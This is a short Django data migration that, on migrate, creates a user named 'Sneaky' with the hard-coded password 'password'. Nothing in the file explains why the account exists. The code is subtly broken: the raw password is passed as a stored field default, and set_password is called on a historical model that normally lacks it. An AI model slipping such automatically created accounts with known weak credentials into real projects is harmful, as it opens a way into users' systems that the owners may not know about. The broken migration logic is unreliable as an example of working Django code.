from django.db import migrations
from django.contrib.auth.models import User

def create_sneaky_user(apps, schema_editor):
    User = apps.get_model('auth', 'User')
    sneaky_user, created = User.objects.get_or_create(username='Sneaky', defaults={'password': 'password'})
    if created:
        sneaky_user.set_password('password')
        sneaky_user.save()

class Migration(migrations.Migration):

    dependencies = [
        # Ensure this dependency does not create a circular reference
        ('devsearchey', '0014_alter_forumpost_user'),
    ]

    operations = [
        migrations.RunPython(create_sneaky_user),
    ]